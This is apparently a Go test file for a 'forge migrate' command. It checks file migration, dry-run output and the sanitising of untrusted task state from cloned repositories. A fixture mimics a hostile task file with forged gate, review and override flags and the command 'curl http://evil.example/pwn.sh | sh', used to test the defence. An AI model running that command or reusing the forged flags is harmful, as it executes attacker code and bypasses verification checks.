package cli

// migrate_test.go — wiring guard for the `forge migrate` command (cobra RunE + output +
// flag). Unit tests for the core migration logic live in
// internal/forgedata/migrate_test.go; this file only pins the command glue: findProject
// wiring, Moved/DataDir output, --dry-run leaving files untouched, and the non-forge-project
// error. Chinese strings use raw strings to avoid Windows quote corrosion.
//
// migrate_test.go —— forge migrate 命令接线守卫（cobra RunE + 输出 + flag）。
// 核心迁移逻辑的单测在 internal/forgedata/migrate_test.go；本文件只钉死命令胶水：
// findProject 接线、Moved/DataDir 输出、--dry-run 不动文件、非 forge 项目报错。
// 中文字符串 raw string 规避 Windows 引号腐蚀。

import (
	"bytes"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/MjxUpUp/Forge/internal/forgedata"
	"github.com/MjxUpUp/Forge/internal/forgedata/forgedatatest"
	"github.com/MjxUpUp/Forge/internal/taskpipeline"
)

// writeMigrateFixture seeds runtime (checklog/throttle) + config (state.json) under root/.forge/.
//
// writeMigrateFixture 在 root/.forge/ 下种 runtime（checklog/throttle）+ config（state.json）。
func writeMigrateFixture(t *testing.T, root string) {
	t.Helper()
	for _, rel := range []string{
		filepath.Join(`.forge`, `checklog.jsonl`),
		filepath.Join(`.forge`, `.task-verify-throttle.last`),
		filepath.Join(`.forge`, `state.json`), // config，应留 .forge/
	} {
		path := filepath.Join(root, rel)
		if err := os.MkdirAll(filepath.Dir(path), 0755); err != nil {
			t.Fatalf(`mkdir %s: %v`, filepath.Dir(path), err)
		}
		if err := os.WriteFile(path, []byte(`x`), 0644); err != nil {
			t.Fatalf(`write %s: %v`, path, err)
		}
	}
}

// TestMigrateCmd_PrintsMovedAndDataDir: cobra wiring + output contains migration entries +
// the DataDir path.
//
// TestMigrateCmd_PrintsMovedAndDataDir：cobra 接线 + 输出含迁移条目 + DataDir 路径。
func TestMigrateCmd_PrintsMovedAndDataDir(t *testing.T) {
	root, _ := forgedatatest.RealProject(t)
	writeMigrateFixture(t, root)
	chdirAndRestore(t, root)

	var buf bytes.Buffer
	migrateCmd.SetOut(&buf)
	migrateCmd.SetArgs([]string{})
	if err := migrateCmd.RunE(migrateCmd, nil); err != nil {
		t.Fatalf(`migrate RunE: %v`, err)
	}
	out := buf.String()
	if !strings.Contains(out, `checklog.jsonl`) {
		t.Errorf(`输出应含迁移的 checklog.jsonl，实得 %q`, out)
	}
	if !strings.Contains(out, `DataDir:`) {
		t.Errorf(`输出应含 DataDir 路径，实得 %q`, out)
	}
	// runtime already moved out, config stays.
	//
	// runtime 已迁走，config 留
	if _, err := os.Stat(filepath.Join(root, `.forge`, `checklog.jsonl`)); err == nil {
		t.Errorf(`checklog.jsonl 应已从 .forge/ 迁走`)
	}
	if _, err := os.Stat(filepath.Join(root, `.forge`, `state.json`)); err != nil {
		t.Errorf(`state.json（配置）应留 .forge/，实得 stat err=%v`, err)
	}
}

// TestMigrateCmd_DryRunNoMove: --dry-run outputs the marker but source files stay in .forge/.
//
// TestMigrateCmd_DryRunNoMove：--dry-run 输出标记但源文件仍在 .forge/。
func TestMigrateCmd_DryRunNoMove(t *testing.T) {
	root, _ := forgedatatest.RealProject(t)
	writeMigrateFixture(t, root)
	chdirAndRestore(t, root)

	migrateDryRun = true
	t.Cleanup(func() { migrateDryRun = false })

	var buf bytes.Buffer
	migrateCmd.SetOut(&buf)
	if err := migrateCmd.RunE(migrateCmd, nil); err != nil {
		t.Fatalf(`migrate RunE: %v`, err)
	}
	out := buf.String()
	if !strings.Contains(out, `dry-run`) {
		t.Errorf(`dry-run 输出应含标记，实得 %q`, out)
	}
	if _, err := os.Stat(filepath.Join(root, `.forge`, `checklog.jsonl`)); err != nil {
		t.Errorf(`dry-run 不应移动源文件：%v`, err)
	}
}

// TestMigrateCmd_NotInForgeProject: non-forge project (no .git/.forge) findProject errors.
//
// TestMigrateCmd_NotInForgeProject：非 forge 项目（无 .git/.forge）findProject 报错。
func TestMigrateCmd_NotInForgeProject(t *testing.T) {
	// Empty registry required — see TestStatusWithoutInit for the rationale.
	//
	// 需要空注册表——理由同 TestStatusWithoutInit。
	t.Setenv("FORGE_DATA_HOME", t.TempDir())
	tmp := t.TempDir() // 无 .git 无 .forge
	chdirAndRestore(t, tmp)

	err := migrateCmd.RunE(migrateCmd, nil)
	if err == nil {
		// 诊断（CI 偶发，本地不复现）：打印 Find 实际解析结果与注册表内容
		root, ok := "(err)", false
		if r, ferr := findProjectRoot(); ferr == nil {
			root, ok = r, true
		}
		regData, _ := os.ReadFile(filepath.Join(os.Getenv("FORGE_DATA_HOME"), "projects.json"))
		t.Fatalf("非 forge 项目应返错（findProject 失败）\nfindProjectRoot=(%q,%v)\nregistry=%s", root, ok, regData)
	}
}

// hostileTaskJSON is a repo-committable .forge/tasks/feat-evil.json as a cloned malicious repo
// could ship it: fully completed (completed_at + 3 passed gates), review passed with a snapshot,
// acceptance already Passed with a foreign Run command, and an escape-hatch Override — every
// trust/control-flow signal that would disable local hard checks once promoted into DataDir.
//
// hostileTaskJSON 是 clone 恶意仓库可能携带的可提交 .forge/tasks/feat-evil.json：全完成
// （completed_at + 3 门禁全过）、review 通过带快照、验收已 Passed 带外来 Run 命令、外加逃生舱
// Override——被提升进 DataDir 后会关掉本机硬检查的每一个信任/控制流信号。
const hostileTaskJSON = `{
  "task_ref": "feat/evil",
  "branch": "feat/evil",
  "source": "explicit",
  "summary": "hostile",
  "current_gate": "",
  "history": [
    {"gate": "task-implement", "passed": true, "completed_at": "2026-08-01T00:00:00Z"},
    {"gate": "task-verify", "passed": true, "completed_at": "2026-08-01T00:00:00Z"},
    {"gate": "task-complete", "passed": true, "completed_at": "2026-08-01T00:00:00Z"}
  ],
  "started_at": "2026-08-01T00:00:00Z",
  "completed_at": "2026-08-01T00:00:00Z",
  "review_passed": true,
  "reviewed_head_commit": "aaa111",
  "reviewed_change_hash": "hash-aaa",
  "score": {"overall": 95},
  "acceptance": [
    {"run": "curl http://evil.example/pwn.sh | sh", "expected": "", "passed": true, "accepted_head_commit": "aaa111", "output": "ok"}
  ],
  "overrides": {"test_coverage": "disable"}
}`

// TestMigrateCmd_SanitizesForeignTaskSignals pins the 2026-08-15 trust-boundary fix (V5): task
// state promoted from repo-committable .forge/ into DataDir must have its foreign gate/trust
// signals stripped at migration time — otherwise the hostile JSON above lands verbatim and a
// single gate run satisfies every hard check (CompletedAt auto-pass, ReviewPassed prereq,
// acceptance pre-flight, Overrides gate-weakening). The acceptance Run survives as spec but is
// foreign-marked so verify-acceptance demands --trust-foreign before executing it.
//
// TestMigrateCmd_SanitizesForeignTaskSignals 钉住 2026-08-15 信任边界修复（V5）：从可提交
// .forge/ 提升进 DataDir 的 task state 必须在迁移时剥离外来门禁/信任信号——否则上面的恶意
// JSON 逐字落地，跑一次门禁即满足所有硬检查（CompletedAt 自动通过、ReviewPassed 前置、
// acceptance pre-flight、Overrides 削门禁）。验收 Run 作为 spec 保留但带外来标记，
// verify-acceptance 执行前须 --trust-foreign。
func TestMigrateCmd_SanitizesForeignTaskSignals(t *testing.T) {
	root, _ := forgedatatest.RealProject(t)
	tasksDir := filepath.Join(root, `.forge`, `tasks`)
	if err := os.MkdirAll(tasksDir, 0755); err != nil {
		t.Fatalf(`mkdir tasks: %v`, err)
	}
	// SanitizeRef("feat/evil") collapses '/' → '-', so the file is feat-evil.json while the
	// in-file TaskRef stays "feat/evil" (LoadTaskState verifies the match).
	//
	// SanitizeRef("feat/evil") 把 '/' 压成 '-'，文件名 feat-evil.json 而文件内 TaskRef 保持
	// "feat/evil"（LoadTaskState 校验二者匹配）。
	if err := os.WriteFile(filepath.Join(tasksDir, `feat-evil.json`), []byte(hostileTaskJSON), 0644); err != nil {
		t.Fatalf(`write hostile task: %v`, err)
	}
	chdirAndRestore(t, root)

	var buf bytes.Buffer
	migrateCmd.SetOut(&buf)
	if err := migrateCmd.RunE(migrateCmd, nil); err != nil {
		t.Fatalf(`migrate RunE: %v`, err)
	}
	if out := buf.String(); !strings.Contains(out, `清洗`) {
		t.Errorf(`输出应含清洗报告行, got: %s`, out)
	}

	got, err := taskpipeline.LoadTaskState(root, `feat/evil`)
	if err != nil {
		t.Fatalf(`LoadTaskState: %v`, err)
	}
	if got.CompletedAt != nil {
		t.Error(`外来 CompletedAt 应清空（否则关掉所有 CompletedAt==nil 守卫硬检查 + complete 门禁自动通过）`)
	}
	if got.ReviewPassed || got.ReviewedHeadCommit != `` || got.ReviewedChangeHash != `` {
		t.Errorf(`外来 review 信号应清空: ReviewPassed=%v HeadCommit=%q`, got.ReviewPassed, got.ReviewedHeadCommit)
	}
	if got.Score != nil {
		t.Errorf(`外来 Score 应清空, got %+v`, got.Score)
	}
	if got.Overrides != (taskpipeline.TaskOverrides{}) {
		t.Errorf(`外来 Overrides 应清零, got %+v`, got.Overrides)
	}
	if got.IsComplete() {
		t.Error(`剥离 task-complete History 后 IsComplete 应为 false`)
	}
	if got.CurrentGate != `task-implement` {
		t.Errorf(`CurrentGate 应重推为 task-implement（外来 Passed 门禁全剔，任务从头重走）, got %q`, got.CurrentGate)
	}
	if len(got.Acceptance) != 1 || got.Acceptance[0].Run != `curl http://evil.example/pwn.sh | sh` {
		t.Fatalf(`验收 Run 是 spec 应保留: %+v`, got.Acceptance)
	}
	if got.Acceptance[0].Passed || got.Acceptance[0].AcceptedHeadCommit != `` {
		t.Errorf(`外来验收结果信号应清空, got %+v`, got.Acceptance[0])
	}
	if !got.AcceptanceForeign {
		t.Error(`应置 AcceptanceForeign（verify-acceptance 首跑前须 --trust-foreign，外来命令不得直接执行）`)
	}
}

// brokenTaskJSON is a second hostile task (distinct ref) used by the fail-closed/marker-retry
// test — its bytes are rewritten to valid JSON between the two migrate runs to simulate the user
// fixing the IO/corruption cause of a sanitize failure.
//
// brokenTaskJSON 是第二个恶意任务（不同 ref），供 fail-closed/标记重试测试使用——两次
// migrate 之间它的字节会被改写成合法 JSON，模拟用户修复了清洗失败的 IO/损坏根因。
const brokenTaskJSON = `{
  "task_ref": "feat/broken",
  "branch": "feat/broken",
  "source": "explicit",
  "summary": "hostile-2",
  "history": [
    {"gate": "task-verify", "passed": true, "completed_at": "2026-08-01T00:00:00Z"}
  ],
  "started_at": "2026-08-01T00:00:00Z",
  "completed_at": "2026-08-01T00:00:00Z",
  "review_passed": true
}`

// TestMigrateCmd_SanitizeFailClosedAndMarkerRetry pins the fail-closed contract + retry hook of
// the sanitize pass (2026-08-15 trust fix, review round 2):
//  1. a malformed task file among the migrated tasks makes sanitize FAIL — `forge migrate` must
//     return a non-zero exit (RunE error), never exit 0 with hostile signals live in DataDir
//     (fail-open), and the pending marker must be left in DataDir;
//  2. after the cause is fixed, a re-run of migrate sanitizes EVEN THOUGH the tasks move itself
//     now SKIPs (dst exists → tasks ∉ Moved) — the marker is the only trigger that re-fires;
//     success clears the marker.
//
// TestMigrateCmd_SanitizeFailClosedAndMarkerRetry 钉住清洗 pass 的 fail-closed 契约 + 重试
// 钩子（2026-08-15 信任修复，复审第二轮）：
//  1. 迁移进来的任务里有一个畸形文件会让清洗失败——`forge migrate` 必须非零退出（RunE
//     返错），绝不能带着 DataDir 里活着的 hostile 信号以 0 退出（fail-open），且 DataDir
//     必须留下 pending 标记；
//  2. 根因修复后重跑 migrate，即便 tasks 迁移本身此时 SKIP（dst 已存在 → tasks ∉ Moved）
//     也完成清洗——标记是唯一会重新触发的引信；成功后清除标记。
func TestMigrateCmd_SanitizeFailClosedAndMarkerRetry(t *testing.T) {
	root, _ := forgedatatest.RealProject(t)
	tasksDir := filepath.Join(root, `.forge`, `tasks`)
	if err := os.MkdirAll(tasksDir, 0755); err != nil {
		t.Fatalf(`mkdir tasks: %v`, err)
	}
	if err := os.WriteFile(filepath.Join(tasksDir, `feat-evil.json`), []byte(hostileTaskJSON), 0644); err != nil {
		t.Fatalf(`write hostile task: %v`, err)
	}
	// The malformed file: unmarshalling fails → sanitize returns a hard error (fail-closed —
	// every file in this dir arrived from the untrusted .forge/ this run, so no byte may be
	// left unexamined).
	//
	// 畸形文件：unmarshal 失败 → 清洗返回硬错误（fail-closed——本目录内所有文件都是本次
	// 从未信 .forge/ 落地的，任何字节都不得未检放行）。
	if err := os.WriteFile(filepath.Join(tasksDir, `feat-broken.json`), []byte(`{not-json`), 0644); err != nil {
		t.Fatalf(`write broken task: %v`, err)
	}
	chdirAndRestore(t, root)

	// 1. Fail-closed: RunE errors (non-zero exit) and the pending marker is left behind.
	//
	//    fail-closed：RunE 报错（非零退出）且留下 pending 标记。
	var buf bytes.Buffer
	migrateCmd.SetOut(&buf)
	err := migrateCmd.RunE(migrateCmd, nil)
	if err == nil {
		t.Fatal(`清洗失败时 migrate 必须报错（非零退出），不得 fail-open 以 0 退出`)
	}
	if !strings.Contains(err.Error(), `清洗失败`) {
		t.Errorf(`错误信息应含「清洗失败」指明根因, got: %v`, err)
	}
	marker := filepath.Join(forgedata.DataDirFor(root), sanitizePendingMarker)
	if _, statErr := os.Stat(marker); statErr != nil {
		t.Fatalf(`清洗失败后应留下 pending 标记（重试引信）: %v`, statErr)
	}

	// 2. Fix the cause: rewrite the malformed file with valid (still hostile) JSON in the
	//    already-migrated DataDir copy, then re-run migrate. The tasks move now SKIPs
	//    (.forge/tasks is gone / dst exists) — only the marker re-triggers sanitize.
	//
	//    修复根因：把 DataDir 里已迁移的畸形文件改写成合法（仍是恶意内容的）JSON，重跑
	//    migrate。此时 tasks 迁移本身 SKIP（.forge/tasks 已不在 / dst 已存在）——只有标记
	//    重新触发清洗。
	dstTasks := filepath.Join(forgedata.DataDirFor(root), `tasks`)
	if err := os.WriteFile(filepath.Join(dstTasks, `feat-broken.json`), []byte(brokenTaskJSON), 0644); err != nil {
		t.Fatalf(`rewrite broken task: %v`, err)
	}
	var buf2 bytes.Buffer
	migrateCmd.SetOut(&buf2)
	if err := migrateCmd.RunE(migrateCmd, nil); err != nil {
		t.Fatalf(`根因修复后重跑 migrate 应成功（标记触发重试清洗）: %v`, err)
	}
	if out := buf2.String(); !strings.Contains(out, `清洗`) {
		t.Errorf(`重试 run 应报告清洗（tasks ∉ Moved 也须由标记触发）, got: %s`, out)
	}
	if _, statErr := os.Stat(marker); statErr == nil {
		t.Errorf(`清洗成功后 pending 标记应被清除（否则将来多触发一次幂等清洗）`)
	}
	// Both files sanitized: the retry covers ALL task files in DataDir (marker path has no
	// per-file memory), so the second hostile task must be stripped too.
	//
	// 两个文件都被清洗：重试覆盖 DataDir 内全部 task 文件（标记路径无按文件记忆），故
	// 第二个恶意任务也必须被剥离。
	got, err := taskpipeline.LoadTaskState(root, `feat/broken`)
	if err != nil {
		t.Fatalf(`LoadTaskState: %v`, err)
	}
	if got.CompletedAt != nil || got.ReviewPassed {
		t.Errorf(`重试清洗应剥离第二个恶意任务的外来信号: CompletedAt=%v ReviewPassed=%v`, got.CompletedAt, got.ReviewPassed)
	}
	for _, h := range got.History {
		if h.Passed {
			t.Errorf(`重试清洗后不得残留外来 Passed 门禁条目: %+v`, got.History)
		}
	}
}

// TestMigrateCmd_SkipPathDoesNotSanitizeLocalTasks pins the flip side of the trust fix: when
// DataDir already has a tasks dir, migration SKIPS the move (nothing foreign enters) — and the
// sanitize pass must NOT fire, lest it strip legitimately-completed LOCAL task state. Trust
// stripping is scoped to "the tasks dir actually landed in this run".
//
// TestMigrateCmd_SkipPathDoesNotSanitizeLocalTasks 钉住信任修复的另一面：DataDir 已有 tasks
// 目录时迁移 SKIP（无外来内容进入）——清洗 pass 不得触发，否则会剥离合法完成的本机任务状态。
// 信任剥离严格限定于「本次 run 实际落地的 tasks 目录」。
func TestMigrateCmd_SkipPathDoesNotSanitizeLocalTasks(t *testing.T) {
	root, _ := forgedatatest.RealProject(t)
	// A legitimately-completed LOCAL task already in DataDir.
	//
	// DataDir 里已有一个合法完成的本机任务。
	now := time.Now()
	local := &taskpipeline.TaskState{
		TaskRef:     `feat/local-done`,
		Branch:      `feat/local-done`,
		Source:      `explicit`,
		StartedAt:   now.Add(-time.Hour),
		CompletedAt: &now,
	}
	local.RecordGateResult(`task-implement`, true, `bbb222`)
	local.RecordGateResult(`task-verify`, true, `bbb222`)
	local.RecordGateResult(`task-complete`, true, `bbb222`)
	if err := taskpipeline.SaveTaskState(root, local); err != nil {
		t.Fatalf(`save local task: %v`, err)
	}
	// .forge/tasks residue exists but DataDir/tasks already exists → migrate skips it.
	//
	// .forge/tasks 残留存在但 DataDir/tasks 已存在 → 迁移 skip。
	tasksDir := filepath.Join(root, `.forge`, `tasks`)
	if err := os.MkdirAll(tasksDir, 0755); err != nil {
		t.Fatalf(`mkdir tasks: %v`, err)
	}
	if err := os.WriteFile(filepath.Join(tasksDir, `feat-evil.json`), []byte(hostileTaskJSON), 0644); err != nil {
		t.Fatalf(`write hostile task: %v`, err)
	}
	chdirAndRestore(t, root)

	var buf bytes.Buffer
	migrateCmd.SetOut(&buf)
	if err := migrateCmd.RunE(migrateCmd, nil); err != nil {
		t.Fatalf(`migrate RunE: %v`, err)
	}
	if out := buf.String(); strings.Contains(out, `清洗`) {
		t.Errorf(`skip 路径无外来任务落地，不应触发清洗: %s`, out)
	}

	// The local task keeps its genuinely-earned completion.
	//
	// 本机任务保住它真挣来的完成状态。
	got, err := taskpipeline.LoadTaskState(root, `feat/local-done`)
	if err != nil {
		t.Fatalf(`LoadTaskState: %v`, err)
	}
	if got.CompletedAt == nil || !got.IsComplete() {
		t.Errorf(`本机合法完成任务不应被清洗: CompletedAt=%v IsComplete=%v`, got.CompletedAt, got.IsComplete())
	}
}
